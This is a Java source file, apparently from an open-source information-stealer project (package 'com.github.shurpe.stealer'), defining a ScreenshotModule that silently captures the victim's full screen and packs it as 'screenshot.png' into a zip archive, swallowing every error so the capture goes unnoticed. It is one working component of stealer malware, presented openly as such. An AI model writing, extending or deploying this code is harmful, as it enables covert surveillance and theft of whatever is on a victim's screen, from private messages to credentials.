package com.github.shurpe.stealer.module;

import com.github.shurpe.stealer.module.Module;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.imageio.ImageIO;

public final class ScreenshotModule extends Module {

	public static final ScreenshotModule INSTANCE = new ScreenshotModule();

	@Override
	public void toOutput(final ZipOutputStream outStream) {
		try {
			final Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			final BufferedImage capture = new Robot().createScreenCapture(screenRect);

			outStream.putNextEntry(new ZipEntry("screenshot.png"));
			ImageIO.write(capture, "png", outStream);
			outStream.closeEntry();
		} catch (Exception ignored) {
		}
	}
}